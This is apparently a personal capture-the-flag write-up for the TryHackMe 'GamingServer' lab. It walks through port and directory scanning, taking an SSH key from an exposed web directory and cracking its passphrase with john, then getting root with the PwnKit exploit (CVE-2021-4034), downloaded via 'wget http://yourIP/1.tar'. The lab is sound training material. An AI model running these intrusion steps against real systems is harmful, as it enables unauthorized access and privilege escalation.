## 👾GamingServer👾
https://tryhackme.com/room/gamingserver

### 👾Enum
```
nmap -Pn -sC -sV -sT 10.10.146.216 -A -p- -vv
```
```
Discovered open port 80/tcp on 10.10.146.216
Discovered open port 22/tcp on 10.10.146.216
```
ちなスキャン終わらず（フレッツ光クロスはよ～）
```
curl http://10.10.146.216/
```
```
<!DOCTYPE html>
<!-- Website template by freewebsitetemplates.com -->
<head>
        <title>House of danak</title>
        <meta  charset="utf-8">
        <link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
                                <li class="last">
                                        <a href="#" class="archives">&nbsp;</a>
                                </li>
                        </ul>
                </div>
        </div>
</body>
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
</html>
```
👾 Username??? john

```
ffuf -u http://10.10.146.216/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -r
```
```
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4148ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5346ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 6441ms]
index.html              [Status: 200, Size: 2762, Words: 241, Lines: 78, Duration: 317ms]
robots.txt              [Status: 200, Size: 33, Words: 3, Lines: 4, Duration: 319ms]
secret                  [Status: 200, Size: 941, Words: 64, Lines: 17, Duration: 312ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 312ms]
uploads                 [Status: 200, Size: 1341, Words: 83, Lines: 19, Duration: 373ms]
:: Progress: [4712/4712] :: Job [1/1] :: 120 req/sec :: Duration: [0:00:43] :: Errors: 0 ::
```
👾 Yummy,do always? Mumumu,itumonoka?

![image](https://user-images.githubusercontent.com/6504854/183280365-fb059090-4a5f-44ef-99db-b91571044faa.png)

![image](https://user-images.githubusercontent.com/6504854/183280392-f50f6fab-1890-4a5b-881b-1d641b66c2ea.png)

![image](https://user-images.githubusercontent.com/6504854/183280409-884b4e59-09a4-422d-887d-b83fe85ff00b.png)

![image](https://user-images.githubusercontent.com/6504854/183280424-4005efc4-af53-452f-a6bb-10b977d82e09.png)

![image](https://user-images.githubusercontent.com/6504854/183280436-e5d7c0f1-c790-441e-92e9-c2a4707415e3.png)

![image](https://user-images.githubusercontent.com/6504854/183280447-d2a3ccb5-8f8d-4fcc-8030-f8c5d7d37f48.png)

👾 I got username and ssh key file

```
vi id_rsa
chmod 600 id_rsa
ssh 10.10.146.216 -i id_rsa
```
```
Enter passphrase for key 'id_rsa':
```
😢

```
ssh2john id_rsa > id_rsa.hash
jhon id_rsa.hash -w=dict.list
```
```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
l******          (id_rsa)
1g 0:00:00:00 DONE (2022-08-07 15:51) 33.33g/s 7400p/s 7400c/s 7400C/s 2003..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### 👾Flag
```
ssh -i id_rsa john@10.10.146.216
```
```
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

j***@exploitable:~$ cat user.txt

j***@exploitable:~$ sudo -l
[sudo] password for j***:
```

```
j***@exploitable:~$ ls -la /usr/bin/pkexec
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
```
🤓

```
j***@exploitable:~$ wget http://yourIP/1.tar
Saving to: ‘1.tar’

1.tar                    100%[=================================>]  90.00K  55.2KB/s    in 1.6s

2022-08-07 07:08:39 (55.2 KB/s) - ‘1.tar’ saved [92160/92160]

j***@exploitable:~$ tar -xvf 1.tar
./cve-2021-4034
./cve-2021-4034.c
./cve-2021-4034.sh
./dry-run/
./README.md

j***@exploitable:~$ ./cve-2021-4034
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(john)
# cat /root/root.txt
```

Thank you for your time. Happy hacking 👾👾👾

スベスベマンジュウガニ食べたら死ぬらしい

のらの蟹は食べちゃダメ


